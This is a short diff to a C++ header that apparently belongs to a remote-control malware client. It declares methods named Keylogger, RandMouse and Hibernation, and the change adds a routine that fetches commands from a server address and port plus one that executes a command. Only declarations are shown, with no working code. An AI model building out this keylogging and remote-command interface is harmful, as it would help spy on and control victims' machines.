@@ -49,7 +49,8 @@ public:
 	void OpenApp(const char* app);
 	void Keylogger(const char* fileName);
 
-    void executeCommands();
+    std::vector<std::string> updateCommands(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands);
+    std::string executeCommand(std::string command);
 
 	void Hibernation();
 	void RandMouse();
